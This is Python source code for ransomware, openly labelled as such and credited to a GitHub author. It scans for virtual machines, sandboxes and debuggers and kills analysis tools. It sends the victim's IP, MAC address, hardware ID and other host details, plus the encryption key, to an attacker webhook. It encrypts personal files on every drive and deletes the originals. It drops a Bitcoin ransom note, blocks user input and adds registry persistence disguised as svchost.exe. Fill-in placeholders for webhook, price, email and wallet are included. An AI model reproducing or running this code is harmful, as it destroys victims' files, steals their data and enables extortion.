'''
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|             Python ransomware Encryptor            |
|                                                    |
|   Created by: CookiesKush420 (github.com/Callumgm) |
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'''


### System Modules ###
import os
import re
import sys
import wmi
import uuid
import ctypes
import random
import psutil
import shutil
import win32api
import requests
import platform
import threading
import subprocess
import win32process


from cryptography.fernet import Fernet
from datetime import datetime
from time import sleep, time
from tkinter import *
from ctypes import *


class AntiDebug():

    def __init__(self , webhook:str):
        self.api                = webhook
        self.vmcheck_switch     = True
        self.vtdetect_switch    = True
        self.listcheck_switch   = True
        self.anti_debug_switch  = True

        #region Infomation
        try: self.ip        = requests.get("https://api.ipify.org").text
        except: self.ip     = "None"
        self.serveruser     = os.getenv("UserName")
        self.pc_name        = os.getenv("COMPUTERNAME")
        self.mac            = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        self.computer       = wmi.WMI()
        self.os_info        = self.computer.Win32_OperatingSystem()[0]
        self.os_name        = self.os_info.Name.encode('utf-8').split(b'|')[0]
        self.gpu            = self.computer.Win32_VideoController()[0].Name
        self.currentplat    = self.os_name
        self.hwid           = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        self.hwidlist       = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
        self.pcnamelist     = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
        self.pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
        self.iplist         = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
        self.maclist        = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
        self.gpulist        = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
        self.platformlist   = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
        #endregion

        self.sandboxDLLs        = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
        self.program_blacklist  = [
            "httpdebuggerui.exe", 
            "wireshark.exe", 
            "HTTPDebuggerSvc.exe", 
            "fiddler.exe", 
            "regedit.exe", 
            "vboxservice.exe", 
            "df5serv.exe", 
            "processhacker.exe", 
            "vboxtray.exe", 
            "vmtoolsd.exe", 
            "vmwaretray.exe", 
            "ida64.exe", 
            "ollydbg.exe",
            "pestudio.exe", 
            "vmwareuser", 
            "vgauthservice.exe", 
            "vmacthlp.exe", 
            "x96dbg.exe", 
            "vmsrvc.exe", 
            "x32dbg.exe", 
            "vmusrvc.exe", 
            "prl_cc.exe", 
            "prl_tools.exe", 
            "xenservice.exe", 
            "qemu-ga.exe", 
            "joeboxcontrol.exe", 
            "ksdumperclient.exe", 
            "ksdumper.exe",
            "joeboxserver.exe"
        ]

    #region Functions
    def post_message(self, msg):
        requests.post(self.api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"{msg}"})

    def anti_debug(self):
        '''
        Will attempt to close any running debuggers then exit the program.
        comment out 'os._exit(1)' to make the program not exit on debugger detection.
        '''
        while True:
            try:
                sleep(0.7)
                for proc in psutil.process_iter():
                    if any(procstr in proc.name().lower() for procstr in self.program_blacklist):
                        try: self.post_message(f"Anti-Debug Program: {proc.name()} was detected running on the system. Closing program...") ; proc.kill()
                        except(psutil.NoSuchProcess, psutil.AccessDenied): pass
            except: pass

    def block_dlls(self):
        while True:
            try:
                sleep(1)
                EvidenceOfSandbox = []
                allPids = win32process.EnumProcesses()
                for pid in allPids:
                    try:
                        hProcess = win32api.OpenProcess(0x0410, 0, pid)
                        try:
                            curProcessDLLs = win32process.EnumProcessModules(hProcess)
                            for dll in curProcessDLLs:
                                dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
                                for sandboxDLL in self.sandboxDLLs:
                                    if sandboxDLL in dllName:
                                        if dllName not in EvidenceOfSandbox: EvidenceOfSandbox.append(dllName)
                        finally:
                                win32api.CloseHandle(hProcess)
                    except: pass
                if EvidenceOfSandbox:
                    requests.post(f'{self.api}',json={'content': f"""```yaml
        The following sandbox-indicative DLLs were discovered loaded in processes running on the system. Do not proceed.
        Dlls: {EvidenceOfSandbox}
        ```"""}) ; os._exit(1)
            except: pass
    
    def ram_check(self):
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        memoryStatus = MEMORYSTATUSEX()
        memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))

        if memoryStatus.ullTotalPhys/1073741824 < 1:
            requests.post(f'{self.api}',json={'content': f"""```yaml
    Ram Check: Less than 4 GB of RAM exists on this system. Exiting program...
    ```"""}) ; os._exit(1)

    def is_debugger(self):
        isDebuggerPresent = windll.kernel32.IsDebuggerPresent()

        if (isDebuggerPresent):
            requests.post(f'{self.api}',json={'content': f"""```yaml
    IsDebuggerPresent: A debugger is present, exiting program...
    ```"""}) ; os._exit(1)

        if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False) != 0:
            requests.post(f'{self.api}',json={'content': f"""```yaml
    CheckRemoteDebuggerPresent: A debugger is present, exiting program...
    ```"""}) ; os._exit(1)

    def disk_check(self):
        minDiskSizeGB = 50
        if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
        diskSizeGB = diskSizeBytes/1073741824

        if diskSizeGB < minDiskSizeGB:
            requests.post(f'{self.api}',json={'content': f"""```yaml
    Disk Check: The disk size of this host is {diskSizeGB} GB, which is less than the minimum {minDiskSizeGB} GB. Exiting program...
    ```"""}) ; os._exit(1)

    def vtdetect(self):
        requests.post(self.api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"""```yaml
    ![PC DETECTED]!  
    PC Name: {self.pc_name}
    PC Username: {self.serveruser}
    HWID: {self.hwid}
    IP: {self.ip}
    MAC: {self.mac}
    PLATFORM: {self.os_name}
    CPU: {self.computer.Win32_Processor()[0].Name}
    RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
    GPU: {self.gpu}
    TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```"""})

    def vmcheck(self):
        def get_base_prefix_compat(): # define all of the checks
            return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

        def in_virtualenv(): 
            return get_base_prefix_compat() != sys.prefix

        if in_virtualenv(): # If vm is detected
            self.post_message("**VM DETECTED, EXITING PROGRAM...**") ; os._exit(1)
        
        def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
            reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
            reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
            
            if reg1 != 1 and reg2 != 1:
                self.post_message("VMware Registry Detected") ; os._exit(1)

        def processes_and_files_check():
            vmware_dll      = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
            virtualbox_dll  = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")   

            process         = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
            processList     = []

            for processNames in process.split(" "):
                if ".exe" in processNames: processList.append(processNames.replace("K\n", "").replace("\n", ""))

            if "VMwareService.exe" in processList or "VMwareTray.exe" in processList: 
                self.post_message("VMwareService.exe & VMwareTray.exe process are running") ; os._exit(1)
                            
            if os.path.exists(vmware_dll): 
                self.post_message("**Vmware DLL Detected**") ; os._exit(1)
                
            if os.path.exists(virtualbox_dll): 
                self.post_message("**VirtualBox DLL Detected**") ; os._exit(1)   

        def mac_check():
            mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
            if mac_address[:8] in vmware_mac_list: self.post_message("**VMware MAC Address Detected**") ; os._exit(1)

        registry_check(), processes_and_files_check(), mac_check()
        self.post_message("[+] VM Not Detected") 

    def listcheck(self):
        try:
            if self.hwid in self.hwidlist.text:
                self.post_message(f"**Blacklisted HWID Detected. HWID:** `{self.hwid}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.serveruser in self.pcusernamelist.text:
                self.post_message(f"**Blacklisted PC User:** `{self.serveruser}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.pc_name in self.pcnamelist.text:
                self.post_message(f"**Blacklisted PC Name:** `{self.pc_name}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.ip in self.iplist.text:
                self.post_message(f"**Blacklisted IP:** `{self.ip}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.mac in self.maclist.text:
                self.post_message(f"**Blacklisted MAC:** `{self.mac}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.gpu in self.gpulist.text:        
                self.post_message(f"**Blacklisted GPU:** `{self.gpu}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)
    #endregion

    def start(self):
        self.is_debugger(), self.disk_check(), self.ram_check() # Run all checks
        if self.anti_debug_switch:
            threading.Thread(name='Anti-Debug', target=self.anti_debug).start()
            threading.Thread(name='Anti-DLL', target=self.block_dlls).start()
        
        if self.vtdetect_switch:     self.vtdetect()      # VTDETECT
        if self.vmcheck_switch:      self.vmcheck()       # VMCHECK
        if self.listcheck_switch:    self.listcheck()     # LISTCHECK

class Encryptor():

    def __init__(self, debug:bool, price:str, email:str, btc_address:str, webhook:str):
        #region Exclusion List
        self.EXTENSIONS = (
            '.exe', '.dll'  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
            '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
            '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies

            '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
            '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
            '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
            '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
            
            '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
            '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
            '.java', '.class', '.jar', # java source code
            '.ps', '.bat', '.vb', '.vbs' # windows based scripts
            '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files

            '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
        )
        
        self.EXCLUDE_DIRECTORY = (
            'Program Files',
            'Program Files (x86)',
            'Windows',
            '$Recycle.Bin',
            'AppData',
            'logs',
        )
        
        self.EXCLUDE_FILES = (
            'svchost',  # Windows service host (persistance filename)
        )
        #endregion

        #region Variables
        self.maxthreading   = 100
        self.maxfilesize    = 5000000 # 5MB
        self.is_admin       = ctypes.windll.shell32.IsUserAnAdmin() != 0
        self.digits         = random.randint(1111,9999)
        self.key            = Fernet.generate_key()
        self.fernet         = Fernet(self.key)
        self.key_           = str(self.key)
        self.key_string     = self.key_[2:-1]
        self.ransom_price   = price
        self.email_address  = email
        self.btc_address    = btc_address
        self.api            = webhook
        #endregion

        self.debug          = debug
        self.start_time     = time()
        self.end_time       = ""

        self.drives         = [ chr(x) + ":" for x in range(65,91) if os.path.exists(chr(x) + ":") ]
        self.pc_username    = os.getlogin()
        
    def print_debug(self, message):
        if self.debug: print("[DEBUG] " + str(message))

    #region Ransomware
    def enc(self, file_name):
        with open(file_name, 'rb') as file: original = file.read()
        encrypted = self.fernet.encrypt(original)
        with open(file_name + '.WANNACRY', 'wb') as encrypted_file: encrypted_file.write(encrypted)
        os.remove(file_name)

    # def scrape_files(self):
    def scrape_files(self, drive):
        list_of_files = list()
        # for (dirpath, dirnames, filenames) in os.walk(f'C:\\Users\\Callum\\Desktop\\testestest'):
        for (dirpath, dirnames, filenames) in os.walk(f'{drive}'): 
            if not any(s in dirpath for s in self.EXCLUDE_DIRECTORY):
                if not any(s in filenames for s in self.EXCLUDE_FILES):
                    list_of_files += [os.path.join(dirpath, file) for file in filenames]

        for l in list_of_files:
            if l.endswith(self.EXTENSIONS):
                try: 
                    # If file is greater than maxfilesize
                    if (os.stat(l).st_size >= self.maxfilesize): 
                        while True:
                            if threading.activeCount() <= self.maxthreading.Threads:
                                self.print_debug(f"Encrypting {l}")
                                threading.Thread(target=self.enc, args=(l, )).start()
                                break
                            else: sleep(0.2)
                    else: self.enc(l)
                except: pass
        elapsed_time = time() - self.start_time
        self.print_debug("Files Encrypted. Time elapsed: " + str(elapsed_time) + " seconds")
    
    def write_readme(self):
        data = f'''
==========================================================================================================================================
==========================================================================================================================================
Ransomware Info:

Digits: {self.digits}
Decryption Price: ${self.ransom_price} in BTC
Bitcoin Payment Address: {self.btc_address}
Contact Email: {self.email_address}

==========================================================================================================================================
==========================================================================================================================================

Your files have been encrypted with high grade military encryption. To be able to decrypt your files, you need to follow these steps:


1) Write down all the information you have about the ransomware virus. 
2) Contact the hacker and tell them what happened. 
3) Think about your life and wonder why you are he 
4) Pay the ransom price in Bitcoin to the payment address provided above. 
5) Send proof of transfer and your digits to the hacker's email address provided above. 
6) After a reply, decrypt your files with the key & decrypter download you received via email. 
7) Decrypt your files. 
8) Happy days :)
==========================================================================================================================================
==========================================================================================================================================
        '''
        with open(f'{os.getenv("USERPROFILE")}\\Desktop\\WANNACRY-README.OPENMEWITHNOTEPAD', 'w') as f:  f.write(data)

        # Write ransom infomation to a file
        with open(os.environ["appdata"] + "\\windows_logs.txt", "w") as p: p.write(f"Current time: {datetime.now()}\n")

    def become_persistent(self):
        try:
            evil_location = os.environ["appdata"] + "\\svchost.exe"
            persistenceCMD = f"REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V \"WindowsUpdate\" /t REG_SZ /F /D \"{evil_location}\""
            
            if not os.path.exists(evil_location):
                cmd = persistenceCMD
                shutil.copy2(sys.executable, evil_location)
                subprocess.call(cmd, shell=True)
        except: pass
    #endregion

    def start(self):
        try:
            requests.post(f'{self.api}',json={'content': f"""```yaml
Ransomware infecting machine: {self.pc_username}

Decrytion Key: {self.key_string}```"""})


            ''' Uncomment code below to use features if client has admin perms '''
            if self.is_admin:
                try: 
                    ctypes.windll.user32.BlockInput(True) # Block input to prevent user from closing the program
                    self.print_debug("Input blocked")
                except: self.print_debug("Failed to block input")
                try: 
                    threading.Thread(target=self.become_persistent).start() # Make program persistent    
                    self.print_debug("Persistent mode enabled")
                except: self.print_debug("Failed to enable persistent mode")

            for drive in self.drives: threading.Thread(target=self.scrape_files, args=(f"{drive}\\", )).start()
            # threading.Thread(target=self.scrape_files).start()
            threading.Thread(target=self.write_readme).start()
        
        except Exception as e:
            requests.post(f'{self.api}',json={'content': f"""```yaml
Error: {e}```"""})


if __name__ == '__main__':
    if platform.system() == "Windows":
        try: requests.get('https://google.com')
        except: os._exit(1)

        AntiDebug().start()

        webhook = "WEBHOOK_HERE"
        price   = "PRICE_HERE"
        email   = "EMAIL_HERE"
        btc     = "BTC_ADDRESS_HERE"

        Encryptor(False, price, email, btc, webhook).start()